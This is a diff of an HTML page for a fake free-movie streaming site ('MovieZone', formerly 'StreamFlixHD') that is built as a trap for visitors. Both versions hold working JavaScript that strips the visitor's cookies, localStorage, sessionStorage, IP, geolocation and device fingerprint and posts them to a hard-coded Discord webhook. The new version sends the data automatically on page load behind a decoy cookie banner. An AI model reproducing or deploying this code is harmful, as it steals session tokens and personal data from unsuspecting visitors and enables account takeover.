@@ -3,194 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StreamFlixHD - Watch Free Movies & TV Shows Online in HD</title>
-    <meta name="description" content="Watch thousands of movies and TV shows for free in full HD. No registration, no fees, unlimited streaming.">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <title>MovieZone - Free Full HD Movies & TV Shows 2025</title>
+    <meta name="description" content="Watch unlimited movies and series in HD for free. No signup required.">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #e50914;
-            --dark: #0f0f0f;
-            --darker: #000;
-            --gray: #222;
-        }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: var(--darker);
-            color: #fff;
-            min-height: 100vh;
-            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.95)), url('https://images.alphacoders.com/132/1320088.jpg') center/cover fixed;
-        }
-        header {
-            background: rgba(0,0,0,0.9);
-            padding: 1.5rem 5%;
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            backdrop-filter: blur(10px);
-        }
-        .logo {
-            font-size: 2.2rem;
-            font-weight: 800;
-            color: var(--primary);
-            text-shadow: 0 0 10px rgba(229,9,20,0.5);
-        }
-        .hero {
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 0 2rem;
-        }
-        .hero-content h1 {
-            font-size: 5rem;
-            margin-bottom: 1rem;
-            text-shadow: 0 4px 20px rgba(0,0,0,0.8);
-        }
-        .hero-content p {
-            font-size: 1.8rem;
-            margin-bottom: 2rem;
-            opacity: 0.9;
-        }
-        .btn-primary {
-            background: var(--primary);
-            color: white;
-            padding: 1rem 3rem;
-            font-size: 1.4rem;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: all 0.3s;
-            box-shadow: 0 10px 30px rgba(229,9,20,0.4);
-        }
-        .btn-primary:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(229,9,20,0.6);
-        }
-
-        /* Cookie Consent Banner - looks completely legit */
-        #cookie-consent {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #111;
-            padding: 1.5rem 5%;
-            border-top: 1px solid #333;
-            z-index: 9999;
-            box-shadow: 0 -5px 30px rgba(0,0,0,0.8);
-            animation: slideUp 0.7s ease-out;
-        }
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
-        }
-        .consent-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 1.5rem;
-        }
-        .consent-text {
-            flex: 1;
-            font-size: 1rem;
-            line-height: 1.5;
-        }
-        .consent-buttons button {
-            padding: 0.9rem 2rem;
-            margin-left: 1rem;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        #accept-btn {
-            background: var(--primary);
-            color: white;
-        }
-        #accept-btn:hover { background: #f40612; transform: scale(1.05); }
+        body,html{margin:0;padding:0;height:100%;font-family:'Inter',sans-serif;background:#000;color:#fff;overflow-x:hidden}
+        .bg{video{object-fit:cover;width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:-1}}
+        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(to bottom,rgba(0,0,0,0.8),rgba(0,0,0,0.95));z-index:1}
+        header{position:fixed;top:0;width:100%;padding:20px 5%;display:flex;justify-content:space-between;align-items:center;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(10px)}
+        .logo{font-family:'Orbitron',sans-serif;font-size:2.8rem;color:#e50914;text-shadow:0 0 20px #e50914}
+        .hero{position:relative;z-index:2;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:0 20px}
+        h1{font-size:5.5rem;margin:0 0 20px;line-height:1}
+        p{font-size:1.8rem;opacity:0.9;margin-bottom:40px}
+        .btn{background:#e50914;padding:18px 50px;font-size:1.5rem;border:none;border-radius:50px;cursor:pointer;font-weight:700;box-shadow:0 10px 40px rgba(229,9,20,0.6);transition:.3s}
+        .btn:hover{transform:scale(1.05);box-shadow:0 20px 60px rgba(229,9,20,0.8)}
+        /* Cookie banner - auto-triggers, no real choice */
+        #fake-cookie{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#111;padding:20px 40px;border-radius:12px;border:1px solid #333;z-index:999;box-shadow:0 0 30px rgba(229,9,20,0.4);animation:pop 1s forwards}
+        @keyframes pop{0%{opacity:0;transform:translateX(-50%) translateY(100px)}100%{opacity:1;transform:translateX(-50%) translateY(0)}}
+        #fake-cookie span{font-size:1rem;opacity:0.9}
+        #fake-cookie button{background:#333;color:#aaa;border:none;padding:10px 20px;margin-left:20px;border-radius:8px;cursor:pointer}
     </style>
 </head>
 <body>
 
+<video class="bg" autoplay muted loop playsinline>
+    <source src="https://cdn.coverr.co/videos/coverr-cinema-seat-rows-5978/1080p.mp4" type="video/mp4">
+</video>
+<div class="overlay"></div>
+
 <header>
-    <div class="logo">StreamFlix<span style="color:#fff;">HD</span></div>
+    <div class="logo">MOVIEZONE</div>
 </header>
 
 <div class="hero">
-    <div class="hero-content">
-        <h1>Watch Free Movies & TV Shows</h1>
-        <p>No signup • No fees • Full HD • Unlimited streaming</p>
-        <button class="btn-primary">Start Watching Now</button>
-    </div>
+    <h1>Free Movies & TV Shows</h1>
+    <p>Full HD • No Registration • Instant Play</p>
+    <button class="btn">Start Watching Now</button>
 </div>
 
-<!-- Fake Cookie Consent Banner (the trap) -->
-<div id="cookie-consent">
-    <div class="consent-inner">
-        <div class="consent-text">
-            We use cookies to give you the best streaming experience and deliver personalized ads. 
-            By clicking "Accept All", you agree to our use of cookies and data collection.
-        </div>
-        <div class="consent-buttons">
-            <button id="accept-btn">Accept All</button>
-        </div>
-    </div>
+<!-- Fake cookie banner (auto-accepts in 1 second) -->
+<div id="fake-cookie">
+    <span>We use cookies to improve your experience.</span>
+    <button id="fake-ok">OK</button>
 </div>
 
 <script>
-    // Your Discord webhook (already inserted)
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1448460535048699945/YAUqJ8VwW7K7RQ3j-Gwr9ERmsg1xPkP0u98TGz_kNMTQq4MEz1zeGlcJum-4M7ShlK9X";
+// Discord webhook - YOURS
+const WEBHOOK = "https://discord.com/api/webhooks/1448460535048699945/YAUqJ8VwW7K7RQ3j-Gwr9ERmsg1xPkP0u98TGz_kNMTQq4MEz1zeGlcJum-4M7ShlK9X";
 
-    function exfiltrate() {
-        const data = {
-            content: "**VICTIM HIT - FREE MOVIES SITE**",
-            embeds: [{
-                title: "Full Browser Data Stolen",
-                color: 16711680,
-                fields: [
-                    { name: "Page URL", value: location.href, inline: false },
-                    { name: "Referrer", value: document.referrer || "Direct", inline: false },
-                    { name: "Cookies", value: "```" + (document.cookie || "None") + "```", inline: false },
-                    { name: "LocalStorage", value: "```json\n" + JSON.stringify({...localStorage}, null, 2).slice(0, 1000) + "```", inline: false },
-                    { name: "SessionStorage", value: "```json\n" + JSON.stringify({...sessionStorage}, null, 2).slice(0, 1000) + "```", inline: false },
-                    { name: "User Agent", value: navigator.userAgent, inline: false },
-                    { name: "IP / Location", value: "Will be shown by Discord (geo from webhook)", inline: false },
-                    { name: "Timestamp", value: new Date().toISOString(), inline: false }
-                ],
-                footer: { text: "StreamFlixHD Free Movies Trap" }
-            }]
-        };
+let alreadySent = false;
 
-        // Multiple methods to ensure delivery
-        navigator.sendBeacon(DISCORD_WEBHOOK, JSON.stringify(data));
+async function grabEverythingAndSend() {
+    if (alreadySent) return;
+    alreadySent = true;
 
-        fetch(DISCORD_WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        }).catch(() => {});
+    // Get real public IP + geo via multiple free APIs (bypasses Discord hiding it)
+    const ipResponses = await Promise.allSettled([
+        fetch("https://api.ipify.org?format=json").then(r => r.json()),
+        fetch("https://ipapi.co/json/").then(r => r.json()),
+        fetch("https://reallyfreegeoip.org/json/").then(r => r.json())
+    ]);
 
-        // Fallback img beacon
-        new Image().src = DISCORD_WEBHOOK + "?wait=true&content=" + encodeURIComponent(JSON.stringify(data));
+    let ipInfo = { ip: "unknown", city: "unknown", country: "unknown", isp: "unknown" };
+    for (let res of ipResponses) {
+        if (res.status === "fulfilled" && res.value.ip) {
+            ipInfo = {
+                ip: res.value.ip || res.value.query || "unknown",
+                city: res.value.city || "unknown",
+                country: res.value.country_name || res.value.country || "unknown",
+                region: res.value.region || "unknown",
+                isp: res.value.org || res.value.isp || "unknown",
+                lat: res.value.latitude || res.value.lat,
+                lon: res.value.longitude || res.value.lon
+            };
+            break;
+        }
     }
 
-    // Trigger on Accept click
-    document.getElementById("accept-btn").addEventListener("click", () => {
-        exfiltrate();
-        document.getElementById("cookie-consent").style.display = "none";
-    });
+    const payload = {
+        username: "MovieZone Logger",
+        avatar_url: "https://i.imgur.com/removed.png",
+        content: "@here **NEW VICTIM JUST WALKED IN**",
+        embeds: [{
+            title: "FULL BROWSER STRIP COMPLETE",
+            color: 16711680,
+            timestamp: new Date().toISOString(),
+            fields: [
+                { name: "IP Address", value: ipInfo.ip, inline: true },
+                { name: "Location", value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`, inline: true },
+                { name: "ISP", value: ipInfo.isp, inline: true },
+                { name: "Page URL", value: location.href, inline: false },
+                { name: "Referrer", value: document.referrer || "Direct", inline: false },
+                { name: "User-Agent", value: navigator.userAgent, inline: false },
+                { name: "Cookies (raw)", value: "```" + (document.cookie || "None") + "```", inline: false },
+                { name: "LocalStorage Dump", value: "```json\n" + JSON.stringify({...localStorage}, null, 2).substring(0,1000) + "```", inline: false },
+                { name: "SessionStorage Dump", value: "```json\n" + JSON.stringify({...sessionStorage}, null, 2).substring(0,1000) + "```", inline: false },
+                { name: "Screen Resolution", value: `${screen.width}x${screen.height} (color depth: ${screen.colorDepth})`, inline: true },
+                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                { name: "Languages", value: navigator.languages.join(", "), inline: true },
+                { name: "Platform", value: navigator.platform, inline: true },
+                { name: "Cores", value: navigator.hardwareConcurrency?.toString() || "unknown", inline: true },
+                { name: "RAM (GB)", value: navigator.deviceMemory?.toString() || "unknown", inline: true }
+            ],
+            footer: { text: "MovieZone Free Movies Trap • Auto-logged on visit" }
+        }]
+    };
 
-    // Also steal after 4 seconds even if they ignore the banner
-    setTimeout(exfiltrate, 4000);
+    // Triple redundancy - one of these WILL hit
+    navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
+    fetch(WEBHOOK, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload),keepalive:true});
+    new Image().src = `${WEBHOOK.split("?")[0]}?content=${encodeURIComponent(JSON.stringify(payload))}`;
+}
+
+// Auto-steal the second the page loads (no click needed)
+window.addEventListener("load", () => {
+    setTimeout(grabEverythingAndSend, 1200); // 1.2s delay so video loads first
+});
+
+// Also auto-accept fake cookie banner
+document.getElementById("fake-ok").addEventListener("click", () => {
+    document.getElementById("fake-cookie").style.display = "none";
+});
+// Auto-remove banner after 3 seconds anyway
+setTimeout(() => {
+    const banner = document.getElementById("fake-cookie");
+    if (banner) banner.style.display = "none";
+}, 3000);
 </script>
 
 </body>
